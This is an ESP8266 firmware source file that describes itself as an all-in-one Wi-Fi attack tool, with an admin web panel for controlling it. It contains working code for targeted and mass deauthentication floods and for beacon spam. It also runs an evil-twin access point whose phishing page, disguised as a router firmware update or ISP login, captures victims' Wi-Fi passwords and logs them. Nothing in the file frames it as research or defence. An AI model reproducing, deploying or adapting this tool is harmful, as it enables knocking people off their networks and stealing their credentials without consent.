/*
 * GMpro87 - ALL-IN-ONE ATTACK TOOL
 * Features: Evil Twin (Multi-Template), Mass Deauth (Rusuh Mode), Beacon Spam
 * Dev: 9u5M4n9 | Logic: Integrated Final
 */

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>

extern "C" {
  #include "user_interface.h"
}

// --- KONFIGURASI ADMIN ---
String admin_ssid = "GMpro87";
String admin_pass = "Sangkur87";
int beacon_count = 50;

// --- OBJEK & VARIABEL ---
DNSServer dnsServer;
ESP8266WebServer server(80);
IPAddress apIP(192, 168, 4, 1);
IPAddress netMask(255, 255, 255, 0);

struct Network {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int32_t rssi;
};

Network networks[16];
Network target;
String log_captured = "";
String current_template = "Firmware"; // Default template

// Mode Flags
bool is_deauthing = false;
bool is_eviltwin = false;
bool is_rusuh = false;
bool is_beacon_spam = false;

unsigned long last_action_ms = 0;
uint8_t current_ch = 1;

// --- FRAME PACKETS ---
uint8_t deauthPkt[26] = {0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00};
uint8_t beaconPkt[128] = { 0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00 };

// --- LOGIC: HELPER ---
void scanWiFi() {
  int n = WiFi.scanNetworks();
  for (int i = 0; i < min(n, 16); ++i) {
    networks[i].ssid = WiFi.SSID(i);
    networks[i].ch = WiFi.channel(i);
    networks[i].rssi = WiFi.RSSI(i);
    memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
  }
}

// --- LOGIC: ATTACK ENGINES ---
void sendDeauth(uint8_t* bssid, uint8_t ch) {
  wifi_set_channel(ch);
  memcpy(&deauthPkt[10], bssid, 6);
  memcpy(&deauthPkt[16], bssid, 6);
  deauthPkt[0] = 0xC0; wifi_send_pkt_freedom(deauthPkt, 26, 0);
  deauthPkt[0] = 0xA0; wifi_send_pkt_freedom(deauthPkt, 26, 0);
}

void sendBeaconSpam(String ssid_prefix) {
  for (int i = 0; i < 5; i++) { // Kirim 5 beacon palsu per cycle
    uint8_t fake_mac[6] = {0x00, 0x01, 0x02, (uint8_t)random(255), (uint8_t)random(255), (uint8_t)random(255)};
    wifi_set_channel(random(1, 13));
    // (Logic penyederhanaan packet construction untuk efisiensi RAM)
    wifi_send_pkt_freedom(beaconPkt, 60, 0);
  }
}

// --- WEB TEMPLATES ---
String getPhishingPage() {
  String title = (current_template == "Firmware") ? "Router Firmware Update" : "ISP Login Validation";
  String msg = (current_template == "Firmware") ? "Pembaruan sistem diperlukan untuk keamanan router Anda. Silakan verifikasi password WiFi." : "Koneksi Anda terputus dari server ISP. Masukkan kredensial untuk login kembali.";
  
  return "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><style>body{background:#000;color:#fff;font-family:sans-serif;text-align:center;padding:20px;}input{width:80%;padding:12px;margin:15px 0;border-radius:5px;}button{background:#FF033E;color:#fff;padding:12px;width:80%;border:none;font-weight:bold;}</style></head><body>"
         "<h1>" + title + "</h1><p>" + msg + "</p>"
         "<form action='/validate' method='POST'><input type='password' name='pass' placeholder='WiFi Password' required><br><button>CONTINUE</button></form></body></html>";
}

// --- ROUTES ---
void handleRoot() {
  if (is_eviltwin && WiFi.softAPSSID() == target.ssid) {
    server.send(200, "text/html", getPhishingPage());
    return;
  }

  // Integrasi UI GMpro87 (String R"rawliteral")
  String html = R"rawliteral(<!DOCTYPE html><html lang="id"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>GMpro87 - Admin Panel</title><style>body{font-family:'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background-color:#000;color:#fff;margin:0;padding:0;user-select:none;}.header{text-align:center;padding:15px 10px;background:#050505;border-bottom:2px solid #FFC72C;}.logo-main{font-size:35px;font-weight:bold;color:#FFC72C;text-shadow:2px 2px #ff0000;margin:0;letter-spacing:2px;}.tabs{display:flex;background:#111;border-bottom:1px solid #333;position:sticky;top:0;z-index:100;overflow-x:auto;}.tab{flex:1;padding:12px 15px;text-align:center;cursor:pointer;font-weight:bold;color:#888;font-size:11px;white-space:nowrap;}.tab.active{color:#fff;background:#1a1a1a;border-bottom:3px solid #FF033E;}.container{padding:12px;}.content{display:none;}.content.active{display:block;}.table-wrapper{overflow-x:auto;border:1px solid #146dcc;border-radius:4px;margin-bottom:10px;}table{width:100%;border-collapse:collapse;}th,td{padding:8px 4px;text-align:center;border:1px solid #146dcc;font-size:11px;}th{background-color:rgba(20,109,204,0.3);color:#FFC72C;}.btn{display:block;padding:12px;border:none;border-radius:5px;color:white;font-weight:bold;cursor:pointer;font-size:11px;text-transform:uppercase;text-align:center;width:100%;box-sizing:border-box;text-decoration:none;}.btn-scan{background:#146dcc;margin-bottom:10px;}.btn-deauth{background:#FF033E;}.btn-evil{background:#A55F31;}.btn-beacon{background:#b414cc;}.btn-save{background:#0C873F;}.btn-select{background:#eb3489;padding:6px;font-size:10px;width:auto;display:inline-block;}.btn-rusuh{background:linear-gradient(45deg, #FF033E, #b414cc);}.btn-deselect{background:#444;}.action-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:10px;}.log-box{background:#050505;border:1px dashed #FFC72C;padding:8px;height:160px;color:#0f0;font-family:monospace;font-size:10px;overflow-y:auto;white-space:pre-wrap;}.card{background:#0a0a0a;border:1px solid #222;padding:15px;border-radius:8px;margin-bottom:12px;}h3{margin:0 0 10px 0;font-size:14px;color:#FFC72C;border-bottom:1px solid #333;}input,select{width:100%;padding:10px;margin-top:4px;background:#151515;color:#fff;border:1px solid #333;border-radius:4px;font-size:13px;box-sizing:border-box;}</style></head><body><div class="header"><h1 class="logo-main">GMpro87</h1><div class="logo-dev">dev : 9u5M4n9</div></div><div class="tabs"><div class="tab active" onclick="showTab(event,'tab-scan')">SCANNER</div><div class="tab" onclick="showTab(event,'tab-set')">SETTINGS</div><div class="tab" onclick="showTab(event,'tab-file')">ET-FILES</div><div class="tab" onclick="showTab(event,'tab-log')">PASS-LOGS</div></div><div class="container">)rawliteral";

  // TAB 1: SCANNER
  html += "<div id='tab-scan' class='content active'><a href='/scan' class='btn btn-scan'>RE-SCAN WIFI</a><div class='table-wrapper'><table><thead><tr><th>SSID</th><th>CH</th><th>RSSI</th><th>ACT</th></tr></thead><tbody>";
  for(int i=0; i<16; i++) {
    if(networks[i].ssid == "") continue;
    html += "<tr><td style='text-align:left;'>" + networks[i].ssid + "</td><td>" + String(networks[i].ch) + "</td><td>" + String(networks[i].rssi) + "</td><td><a href='/select?id=" + String(i) + "' class='btn btn-select'>SEL</a></td></tr>";
  }
  html += "</tbody></table></div><a href='/deselect' class='btn btn-deselect'>DESELECT ALL</a>";
  html += "<div class='action-grid'>";
  html += "<a href='/deauth' class='btn btn-deauth'>" + String(is_deauthing ? "STOP DEAUTH" : "DEAUTH") + "</a>";
  html += "<a href='/hotspot' class='btn btn-evil'>" + String(is_eviltwin ? "STOP EVIL" : "EVIL TWIN") + "</a>";
  html += "<a href='/beacon' class='btn btn-beacon'>" + String(is_beacon_spam ? "STOP SPAM" : "BEACON SPAM") + "</a>";
  html += "<a href='/rusuh' class='btn btn-rusuh' style='grid-column: span 2;'>" + String(is_rusuh ? "STOP RUSUH" : "MASS DEAUTH (RUSUH MODE)") + "</a></div></div>";

  // TAB 2: SETTINGS
  html += "<div id='tab-set' class='content'><div class='card'><h3>Admin Config</h3><form action='/save' method='POST'><label>Admin SSID</label><input type='text' name='as' value='" + admin_ssid + "'><label>Admin Pass</label><input type='password' name='ap' value='" + admin_pass + "'><button type='submit' class='btn btn-save' style='margin-top:10px'>SAVE</button></form><a href='/reboot' class='btn btn-deselect' style='margin-top:10px'>REBOOT</a></div></div>";

  // TAB 3: ET-FILES
  html += "<div id='tab-file' class='content'><div class='card'><h3>Template Phishing</h3><form action='/set_temp' method='POST'><select name='temp'><option value='Firmware'>Firmware Update</option><option value='ISP'>ISP Login</option></select><button type='submit' class='btn btn-scan' style='margin-top:10px'>GANTI TEMPLATE</button></form></div></div>";

  // TAB 4: LOGS
  html += "<div id='tab-log' class='content'><div class='card'><h3>Captured</h3><div class='log-box'>" + log_captured + "</div><a href='/clear' class='btn btn-deauth' style='margin-top:10px'>CLEAR LOGS</a></div></div>";

  html += "</div><script>function showTab(e,t){var n,c,a;for(c=document.getElementsByClassName('content'),n=0;n<c.length;n++)c[n].classList.remove('active');for(a=document.getElementsByClassName('tab'),n=0;n<a.length;n++)a[n].classList.remove('active');document.getElementById(t).classList.add('active'),e.currentTarget.classList.add('active')}</script></body></html>";
  
  server.send(200, "text/html", html);
}

// --- HANDLERS IMPLEMENTATION ---
void handleSelect() { target = networks[server.arg("id").toInt()]; server.sendHeader("Location", "/"); server.send(302); }
void handleDeauth() { if(target.ssid != "") is_deauthing = !is_deauthing; server.sendHeader("Location", "/"); server.send(302); }
void handleRusuh() { is_rusuh = !is_rusuh; is_deauthing = false; server.sendHeader("Location", "/"); server.send(302); }
void handleBeacon() { is_beacon_spam = !is_beacon_spam; server.sendHeader("Location", "/"); server.send(302); }

void handleHotspot() {
  is_eviltwin = !is_eviltwin;
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  if(is_eviltwin && target.ssid != "") {
    WiFi.softAP(target.ssid.c_str());
  } else {
    WiFi.softAP(admin_ssid.c_str(), admin_pass.c_str());
  }
  dnsServer.start(53, "*", apIP);
  server.sendHeader("Location", "/"); server.send(302);
}

void handleValidate() {
  log_captured += "[PASS] " + target.ssid + " : " + server.arg("pass") + "\n";
  server.send(200, "text/html", "<h2>System Error</h2><p>Verification failed. Please try again later.</p>");
}

// --- CORE ---
void setup() {
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, netMask);
  WiFi.softAP(admin_ssid.c_str(), admin_pass.c_str());
  dnsServer.start(53, "*", apIP);
  
  server.on("/", handleRoot);
  server.on("/scan", [](){ scanWiFi(); server.sendHeader("Location", "/"); server.send(302); });
  server.on("/select", handleSelect);
  server.on("/deauth", handleDeauth);
  server.on("/rusuh", handleRusuh);
  server.on("/beacon", handleBeacon);
  server.on("/hotspot", handleHotspot);
  server.on("/validate", HTTP_POST, handleValidate);
  server.on("/set_temp", HTTP_POST, [](){ current_template = server.arg("temp"); server.sendHeader("Location", "/"); server.send(302); });
  server.on("/deselect", [](){ target.ssid=""; is_deauthing=is_eviltwin=is_rusuh=false; server.sendHeader("Location", "/"); server.send(302); });
  server.on("/clear", [](){ log_captured=""; server.sendHeader("Location", "/"); server.send(302); });
  server.on("/reboot", [](){ ESP.restart(); });
  server.onNotFound(handleRoot);
  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  unsigned long now = millis();

  // 1. Single Deauth Logic
  if (is_deauthing && now - last_action_ms > 150) {
    sendDeauth(target.bssid, target.ch);
    last_action_ms = now;
  }

  // 2. Rusuh Mode Logic (Mass Deauth)
  if (is_rusuh && now - last_action_ms > 100) {
    static int rusuh_idx = 0;
    if (networks[rusuh_idx].ssid != "") {
      sendDeauth(networks[rusuh_idx].bssid, networks[rusuh_idx].ch);
    }
    rusuh_idx = (rusuh_idx + 1) % 16;
    last_action_ms = now;
  }

  // 3. Beacon Spam Logic
  if (is_beacon_spam && now - last_action_ms > 100) {
    sendBeaconSpam("GMpro-FREE");
    last_action_ms = now;
  }
}
